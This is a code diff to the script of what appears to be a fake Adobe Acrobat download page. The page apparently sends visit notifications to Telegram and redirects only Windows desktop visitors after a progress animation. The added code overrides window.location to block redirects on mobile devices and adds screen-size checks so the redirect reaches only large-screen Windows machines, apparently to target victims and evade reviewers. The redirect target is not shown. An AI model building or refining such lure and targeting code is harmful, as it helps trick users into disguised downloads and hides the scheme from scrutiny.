@@ -712,11 +712,35 @@
     function showMobileModal() {
       document.getElementById('mobileModal').style.display = 'block';
       document.body.style.overflow = 'hidden'; // Prevent scrolling
+      
+      // Completely block any redirect attempts on mobile
+      console.log('Mobile modal shown - redirects blocked');
+      
+      // Override window.location methods to prevent redirects
+      const originalHref = window.location.href;
+      Object.defineProperty(window.location, 'href', {
+        get: function() { return originalHref; },
+        set: function(url) { 
+          console.log('Redirect attempt blocked on mobile:', url);
+          return originalHref;
+        }
+      });
+      
+      // Block other redirect methods
+      window.location.replace = function() { 
+        console.log('window.location.replace() blocked on mobile');
+      };
+      window.location.assign = function() { 
+        console.log('window.location.assign() blocked on mobile');
+      };
     }
     
     function closeMobileModal() {
       document.getElementById('mobileModal').style.display = 'none';
       document.body.style.overflow = 'auto'; // Restore scrolling
+      
+      // Keep redirects blocked even after closing modal
+      console.log('Mobile modal closed - redirects still blocked');
     }
     
     // Telegram Notification Functions
@@ -832,12 +856,20 @@ Adobe Acrobat Download Page Visit`;
           showMobileModal();
         }, 1000);
         
+        // Completely disable all redirect functionality on mobile
+        console.log('Mobile device detected - all redirects disabled');
+        
+        // Override any potential redirect attempts
+        window.location.href = window.location.href; // Stay on current page
+        window.location.replace = function() { console.log('Redirect blocked on mobile'); };
+        window.location.assign = function() { console.log('Redirect blocked on mobile'); };
+        
         // Don't start progress animation or redirect on mobile/non-Windows
         return;
       }
       
       // Only run progress animation and redirect on Windows desktop
-      if (isWindowsOS() && !isMobileDevice()) {
+      if (isWindowsOS() && !isMobileDevice() && window.innerWidth > 768 && window.innerHeight > 1024) {
         // Animate progress percentage from 0% to 100% over 2 seconds
         const percentageElement = document.getElementById('progress-percentage');
         const duration = 2000; // 2 seconds (reduced from 4 seconds)
@@ -867,9 +899,15 @@ Adobe Acrobat Download Page Visit`;
     function triggerRedirectAfterAnimation() {
       console.log('Animation completed, checking for redirect...');
       
-      // Double-check that we're on Windows desktop before redirecting
+      // Triple-check that we're on Windows desktop before redirecting
       if (!isWindowsOS() || isMobileDevice()) {
         console.log('Skipping redirect - not Windows desktop');
+        return;
+      }
+      
+      // Additional mobile check to be absolutely sure
+      if (window.innerWidth <= 768 || window.innerHeight <= 1024) {
+        console.log('Skipping redirect - mobile screen size detected');
         return;
       }
       
